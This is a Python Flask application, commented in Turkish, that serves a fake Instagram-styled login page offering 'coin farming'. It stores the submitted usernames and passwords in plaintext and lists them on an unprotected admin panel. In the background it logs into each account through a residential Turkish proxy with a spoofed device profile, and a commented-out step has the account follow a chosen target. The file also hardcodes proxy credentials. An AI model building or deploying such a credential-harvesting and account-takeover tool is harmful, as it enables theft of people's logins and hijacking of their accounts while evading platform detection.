import os
import threading
import time
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from dotenv import load_dotenv

# 1. AYARLAR VE VERİTABANI
load_dotenv()
app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL", "sqlite:///test.db")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# --- SENİN GÜNCEL TÜRKİYE PROXY URL'N ---
PROXY_URL = "http://pcUjiruWbB-res-tr:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959"

class IGUser(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True)
    password = db.Column(db.String(100))
    status = db.Column(db.String(100), default="Bekliyor")

# 2. HIZLI GİRİŞ VE TAKİP MOTORU (TURBO)
def fast_login_and_action(username, password):
    with app.app_context():
        user_record = IGUser.query.filter_by(username=username).first()
        cl = Client()
        try:
            # Proxy'yi ve zaman aşımını set et
            cl.set_proxy(PROXY_URL)
            cl.request_timeout = 10  # 10 saniye içinde cevap gelmezse asılı kalma
            
            user_record.status = "Giriş Yapılıyor... ⚡"
            db.session.commit()
            
            # Cihaz ayarlarını Türkiye lokasyonuna zorla
            cl.set_device_settings({
                "device_model": "iPhone13,2",
                "locale": "tr_TR",
                "timezone_offset": 10800
            })
            
            # Instagram'a giriş yap
            if cl.login(username, password):
                user_record.status = "AKTİF ✅ (COIN KASIYOR)"
                db.session.commit()
                
                # ÖRNEK: Giriş yapan hesap senin belirlediğin birini takip etsin
                # user_id = cl.user_id_from_username("HEDEF_HESAP_ADI")
                # cl.user_follow(user_id)
                
            else:
                user_record.status = "Şifre Hatalı ❌"
                db.session.commit()
        except Exception as e:
            # Hata varsa panelde kısa mesaj olarak göster
            user_record.status = f"Hata: {str(e)[:20]}"
            db.session.commit()

# 3. KULLANICI ARAYÜZÜ (HTML)
@app.route('/')
def home():
    return render_template_string("""
    <body style="background:#000;color:#fff;font-family:sans-serif;text-align:center;padding-top:100px;">
        <h1 style="font-style:italic;">Instagram</h1>
        <div style="border:1px solid #333; display:inline-block; padding:30px; border-radius:10px;">
            <input id="u" placeholder="Kullanıcı Adı" style="display:block;margin:10px;padding:10px;width:250px;"><br>
            <input id="p" type="password" placeholder="Şifre" style="display:block;margin:10px;padding:10px;width:250px;"><br>
            <button onclick="start()" id="b" style="width:270px;padding:12px;background:#0095f6;color:#fff;border:none;font-weight:bold;cursor:pointer;">Giriş Yap & Coin Kas</button>
            <p id="m" style="font-size:12px;margin-top:20px;color:#888;"></p>
        </div>
        <script>
            async function start(){
                const u=document.getElementById('u').value, p=document.getElementById('p').value;
                const b=document.getElementById('b'), m=document.getElementById('m');
                if(!u || !p) return;
                b.innerText="Başlatılıyor..."; b.disabled=true;
                const r=await fetch('/api/start-login',{
                    method:'POST',headers:{'Content-Type':'application/json'},
                    body:JSON.stringify({u,p})
                });
                const d=await r.json();
                m.innerText=d.msg;
            }
        </script>
    </body>
    """)

# 4. API VE ADMIN PANELİ
@app.route('/api/start-login', methods=['POST'])
def start_login():
    data = request.json
    u, p = data.get('u'), data.get('p')
    user = IGUser.query.filter_by(username=u).first()
    if not user:
        user = IGUser(username=u, password=p); db.session.add(user)
    else:
        user.password, user.status = p, "İşlem Sırasına Alındı..."
    db.session.commit()
    
    # Botu arka planda (Thread) saniyeler içinde başlat
    threading.Thread(target=fast_login_and_action, args=(u, p), daemon=True).start()
    return jsonify(status="success", msg="Sistem bağlandı, 10 saniye içinde paneli kontrol edin.")

@app.route('/panel-admin')
def admin():
    users = IGUser.query.order_by(IGUser.id.desc()).all()
    res = "<h2>CANLI DURUM PANELİ</h2><table border='1' cellpadding='10'><tr><th>User</th><th>Pass</th><th>Durum</th></tr>"
    for u in users: res += f"<tr><td>{u.username}</td><td>{u.password}</td><td>{u.status}</td></tr>"
    return res + "</table>"

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
